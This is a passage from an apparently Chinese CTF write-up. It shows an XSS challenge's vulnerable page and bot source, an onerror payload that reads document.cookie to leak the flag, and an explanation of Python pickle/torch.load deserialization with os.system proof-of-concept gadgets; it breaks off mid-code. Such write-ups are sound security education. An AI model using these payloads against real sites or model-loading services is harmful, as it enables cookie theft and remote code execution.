href="http://202.38.93.111:10056/share?result=MTAwOjExMjMxMg==#">http://202.38.93.111:10056/share?result=MTAwOjExMjMxMg%3D%3D#</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104094512355.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104094512355.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104094512355"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104094528706.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104094528706.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104094528706"></p><p>虽然是对的，但是不给flag，嘻嘻</p><p>2.XSS</p><p>随便填，提交后代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/bootstrap/css/bootstrap.min.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>微 积 分 计 算 小 练 习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container px-3 py-3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>练习成绩页面<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;greeting&quot;</span>&gt;</span>您好，[[ username ]]！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;score&quot;</span>&gt;</span>您在练习中获得的分数为 <span class="tag">&lt;<span class="name">b</span>&gt;</span>[[ score ]]<span class="tag">&lt;/<span class="name">b</span>&gt;</span>/100。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">id</span>=<span class="string">&quot;copy&quot;</span>&gt;</span>点击此链接，将页面 URL 复制到剪贴板。<span class="tag">&lt;/<span class="name">a</span>&gt;</span>你可返回平台，在「提交练习成绩 URL」处提交这里复制的 URL。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>再试一次<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">click</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;input&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            input.<span class="title function_">setAttribute</span>(<span class="string">&#x27;readonly&#x27;</span>, <span class="string">&#x27;readonly&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            input.<span class="title function_">setAttribute</span>(<span class="string">&#x27;value&#x27;</span>, url);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(input);</span></span><br><span class="line"><span class="language-javascript">            input.<span class="title function_">select</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&#x27;已复制到剪贴板&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(input);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#copy&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, click);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> queryString = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(queryString);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> result = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;result&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> b64decode = <span class="title function_">atob</span>(result);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> colon = b64decode.<span class="title function_">indexOf</span>(<span class="string">&quot;:&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> score = b64decode.<span class="title function_">substring</span>(<span class="number">0</span>, colon);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> username = b64decode.<span class="title function_">substring</span>(colon + <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#greeting&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;您好，&quot;</span> + username + <span class="string">&quot;！&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#score&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;您在练习中获得的分数为 &lt;b&gt;&quot;</span> + score + <span class="string">&quot;&lt;/b&gt;/100。&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先分析click，window.location.herf为当前打开页面，document.createElement为创建input的HTML标签。input.setAttribute向input标签填属性，和value不同的是setAttribute会直接向input添加属性而不是只改变输入框的内容。document.body.appendChild把input追加到body部分。document.execCommand()指点击链接时把url copy到剪切板。所以click的作用就是</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104204609164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104204609164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104204609164"></p><p>点击此链接，复制到剪切板</p><p>重点在于后面定义的几个常量。在页面上显示的”您好，1”和分数都在innerHTML内，但事实上innerHTML具有很大的漏洞。innerHTML虽然不执行&lt;script&gt;标签，但是XSS事件是不需要script标签进行XSS的。</p><p>windows.location.search获取url字符串，经过URLSearchParams解析后用atob解码base64,然后:签名为分数后面为用户名。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104210001641.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104210001641.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104210001641"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104205941206.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104205941206.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104205941206"></p><p><code>&lt;img src=a onclick=&quot;alert(1)&quot;&gt;</code> base64后传入result，点击图片处发生弹窗</p><p>但是不方便，用onerror，图片herf乱写是一定会加载错误的。</p><p>在bot.py里给出了提交链接的源码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># secret.py will NOT be revealed to players</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG, BOT_SECRET</span><br><span class="line"></span><br><span class="line">LOGIN_URL = <span class="string">f&#x27;http://web/?bot=<span class="subst">&#123;BOT_SECRET&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Please submit your quiz URL:&#x27;</span>)</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL replacement</span></span><br><span class="line"><span class="comment"># In our environment bot access http://web</span></span><br><span class="line"><span class="comment"># If you need to test it yourself locally you should adjust LOGIN_URL and remove the URL replacement source code</span></span><br><span class="line"><span class="comment"># and write your own logic to use your own token to &quot;login&quot; with headless browser</span></span><br><span class="line">parsed = urllib.parse.urlparse(url)</span><br><span class="line">parsed = parsed._replace(netloc=<span class="string">&quot;web&quot;</span>, scheme=<span class="string">&quot;http&quot;</span>)</span><br><span class="line">url = urllib.parse.urlunparse(parsed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Your URL converted to <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>) <span class="comment"># sandbox not working in docker</span></span><br><span class="line">    options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--user-data-dir=/dev/shm/user-data&#x27;</span>)</span><br><span class="line">    os.environ[<span class="string">&#x27;TMPDIR&#x27;</span>] = <span class="string">&quot;/dev/shm/&quot;</span></span><br><span class="line">    options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-logging&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> webdriver.Chrome(options=options) <span class="keyword">as</span> driver:</span><br><span class="line">        ua = driver.execute_script(<span class="string">&#x27;return navigator.userAgent&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; I am using&#x27;</span>, ua)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;- Logining...&#x27;</span>)</span><br><span class="line">        driver.get(LOGIN_URL)</span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; Putting secret flag...&#x27;</span>)</span><br><span class="line">        driver.execute_script(<span class="string">f&#x27;document.cookie=&quot;flag=<span class="subst">&#123;FLAG&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;- Now browsing your quiz result...&#x27;</span>)</span><br><span class="line">        driver.get(url)</span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            greeting = driver.execute_script(<span class="string">f&quot;return document.querySelector(&#x27;#greeting&#x27;).textContent&quot;</span>)</span><br><span class="line">            score = driver.execute_script(<span class="string">f&quot;return document.querySelector(&#x27;#score&#x27;).textContent&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> selenium.common.exceptions.JavascriptException:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;JavaScript Error: Did you give me correct URL?&#x27;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK. Now I know that:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(greeting)</span><br><span class="line">        <span class="built_in">print</span>(score)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;- Thank you for joining my quiz!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ERROR&#x27;</span>, <span class="built_in">type</span>(e))</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line">    traceback.print_exception(*sys.exc_info(), limit=<span class="number">0</span>, file=<span class="literal">None</span>, chain=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中最为重要的是三个driver.execute_script执行JS代码匹配#greeting,#score对象并输出，并把flag写入JS的cookie中。所以把cookie写入到#greeting或者#score其中一个内就会把flag输出。</p><p>payload:<code>1:&lt;img src=a onerror=&#39;var b=document.cookie;document.querySelector(&quot;#greeting&quot;).textContent=b;&#39;&gt;</code></p><p>base64加密后复制url至terminal ctrl+shift+V</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104220956849.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104220956849.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104220956849"></p><h2 id="二次元神经网络"><a href="#二次元神经网络" class="headerlink" title="二次元神经网络"></a>二次元神经网络</h2><blockquote><p>天冷极了，下着雪，又快黑了。这是一年的最后一天——大年夜。在这又冷又黑的晚上，一个没有 GPU、没有 TPU 的小女孩，在街上缓缓地走着。她从家里出来的时候还带着捡垃圾捡来的 E3 处理器，但是有什么用呢？跑不动 Stable  Diffusion，也跑不动 NovelAI。她也想用自己的处理器训练一个神经网络，生成一些二次元的图片。<br>于是她配置好了 PyTorch 1.9.1，定义了一个极其简单的模型，用自己收集的 10 张二次元图片和对应的标签开始了训练。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SimpleGenerativeModel(</span><br><span class="line"> (tag_encoder): TagEncoder(</span><br><span class="line">   (embedding): Embedding(63, 8, padding_idx=0)</span><br><span class="line"> )</span><br><span class="line"> (model): Sequential(</span><br><span class="line">   (0): Linear(in_features=16, out_features=8, bias=True)</span><br><span class="line">   (1): ReLU()</span><br><span class="line">   (2): Linear(in_features=8, out_features=8, bias=True)</span><br><span class="line">   (3): ReLU()</span><br><span class="line">   (4): Linear(in_features=8, out_features=64 * 64 * 3, bias=True)</span><br><span class="line">   (5): Tanh()</span><br><span class="line"> )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>她在 CPU 上开始了第一个 epoch 的训练，loss 一直在下降，许多二次元图片重叠在一起，在向她眨眼睛。<br>她又开始了第二个 epoch，loss 越来越低，图片越来越精美，她的眼睛也越来越累，她的眼睛开始闭上了。<br>…<br>第二天清晨，这个小女孩坐在墙角里，两腮通红，嘴上带着微笑。新年的太阳升起来了，照在她小小的尸体上。<br>人们发现她时才知道，她的模型在 10 张图片上过拟合了，几乎没有误差。<br>（完）<br>听完这个故事，你一脸的不相信：「这么简单的模型怎么可能没有误差呢？」，于是你开始复现这个二次元神经网络。</p></blockquote><h3 id="python反序列化知识"><a href="#python反序列化知识" class="headerlink" title="python反序列化知识"></a>python反序列化知识</h3><p>python通过loads反序列化，dumps序列化。和php一样可以序列化字符串、数组、数和类</p><p>pickletools可以反汇编一个序列化出来的字符串，方便调试，分析案例见<code>https://xz.aliyun.com/t/7436</code>，文章详细介绍了反系列化原理，并且给出了opcode的用法</p><p>通用的poc，利用<code>__reduce__</code>RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class genpoc(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;  # 要执行的命令</span><br><span class="line">        return os.system, (s,)        # reduce函数必须返回元组或字符串</span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line">print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令</span><br></pre></td></tr></table></figure><p>但是需要一次执行多个函数时就不能光用<code>__reduce__</code>，reduce一次只能执行一个函数(除了exec可以堆叠执行命令)。当然这道题就一个reduce就可以了。opcode的编写实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># main.py</span><br><span class="line">import pickle</span><br><span class="line">import secret</span><br><span class="line"></span><br><span class="line">opcode=&#x27;&#x27;&#x27;c__main__</span><br><span class="line">secret</span><br><span class="line">(S&#x27;name&#x27;</span><br><span class="line">S&#x27;1&#x27;</span><br><span class="line">db.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(&#x27;before:&#x27;,secret.name)</span><br><span class="line"></span><br><span class="line">output=pickle.loads(opcode.encode())</span><br><span class="line"></span><br><span class="line">print(&#x27;output:&#x27;,output)</span><br><span class="line">print(&#x27;after:&#x27;,secret.name)</span><br></pre></td></tr></table></figure><p>上述代码用<code>c</code>获取全局变量secret，用<code>d</code>建立一个字典，<code>b</code>用栈的第一个元素做key,第二个元素做属性，<code>(</code>压栈，<code>S&#39;&#39;</code>为字符串对象，<code>.</code>结束。所以以上代码的意思为name&#x3D;1对全局变量name的值进行覆盖。</p><p>同理，构造函数可以用<code>R</code>,<code>i</code>,<code>o</code></p><ol><li>R</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p><code>cos</code>import库，<code>t</code>表示从上一个<code>(</code>开始把后面的元素组合为元组，上述代码只有一个<code>S‘whoami&#39;</code>，就构成<code>[&#39;whoami&#39;]</code>，R表示栈的第一个对象<code>system</code>作为函数，第二个对象也就是<code>[&#39;whoami&#39;]</code>作为参数调用函数，组合起来就是<code>system(whoami)</code>（不需要单引号包裹whoami因为已经用S’‘表示了数据类型）</p><ol start="2"><li>i</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p><code>s</code>生成system-whoami键值对并添加到栈的第三个对象，并把whoami和system出栈，o实例化system-whoami对象，i调用o实现函数调用。<code>system(whoami)</code></p><ol start="3"><li>o</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>o操作调用system为函数，whoami为参数执行。和R区别不同的是参数对象不用为元组</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>如果认真了解过python反序列化，每篇文章开始几乎都会介绍python反序列化的入口函数，也就是pickle模块的pickle.load和pickle.loads，而torch.load反序列化的方式和pickle.load完全相同，所以利用方式也相同。</p><p>题目打开为如下界面：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106164307866.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106164307866.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221106164307866"></p><p>下载解压附件2d_model.zip。题目描述上传模型由infer.py运行。infer.py源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> matplotlib.image</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> SimpleGenerativeModel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">pt_file</span>):</span><br><span class="line">    <span class="comment"># load input data</span></span><br><span class="line">    tag_ids = torch.load(<span class="string">&quot;dataset/tags_10.pt&quot;</span>, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># args</span></span><br><span class="line">    n_tags = <span class="number">63</span></span><br><span class="line">    dim = <span class="number">8</span></span><br><span class="line">    img_shape = (<span class="number">64</span>, <span class="number">64</span>, <span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># load model</span></span><br><span class="line">    model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=img_shape)</span><br><span class="line">    model.load_state_dict(torch.load(pt_file, map_location=<span class="string">&quot;cpu&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># generate noise</span></span><br><span class="line">    torch.manual_seed(<span class="number">0</span>)</span><br><span class="line">    n_samples = tag_ids.shape[<span class="number">0</span>]</span><br><span class="line">    noise = torch.randn(n_samples, dim)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># forward</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        model.<span class="built_in">eval</span>()</span><br><span class="line">        predictions = model(noise, tag_ids).clamp(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    gen_imgs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_samples):</span><br><span class="line">        out_io = io.BytesIO()</span><br><span class="line">        matplotlib.image.imsave(out_io, predictions[i].numpy(), <span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">        png_b64 = base64.b64encode(out_io.getvalue()).decode()</span><br><span class="line">        gen_imgs.append(png_b64)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># save the predictions</span></span><br><span class="line">    json.dump(&#123;<span class="string">&quot;gen_imgs_b64&quot;</span>: gen_imgs&#125;, <span class="built_in">open</span>(<span class="string">&quot;/tmp/result.json&quot;</span>, <span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    infer(<span class="built_in">open</span>(<span class="string">&quot;checkpoint/model.pt&quot;</span>, <span class="string">&quot;rb&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span 